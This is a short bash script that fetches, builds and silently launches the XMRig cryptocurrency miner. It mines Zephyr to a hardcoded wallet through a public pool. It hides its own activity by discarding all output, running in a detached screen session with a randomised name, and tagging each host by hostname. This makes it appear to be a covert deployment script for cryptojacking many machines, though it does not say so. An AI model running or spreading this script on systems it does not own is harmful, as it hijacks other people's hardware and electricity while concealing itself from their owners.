#!/bin/bash

sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen > /dev/null 2>&1

RAND_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

if [ ! -d "xmrig" ]; then
    git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1
    mkdir -p xmrig/build && cd xmrig/build
    cmake .. > /dev/null 2>&1
    make -j$(nproc) > /dev/null 2>&1
else
    cd xmrig/build
fi

sudo sysctl -w vm.nr_hugepages=1280 > /dev/null 2>&1

screen -dmS "$RAND_NAME" ./xmrig -a rx/0 \
-o zephyr.herominers.com:1123 \
-u ZEPHsAonkz3gkWmWnpSeuh83X2Y1AaCMReH32qi84HGFR4VgLzrHqdnhAWGMHJLjQabhPfVGykTSHPe4ZanuCZB61z7vZ6Nn3u6 \
-p "$(hostname)_$RAND_NAME"
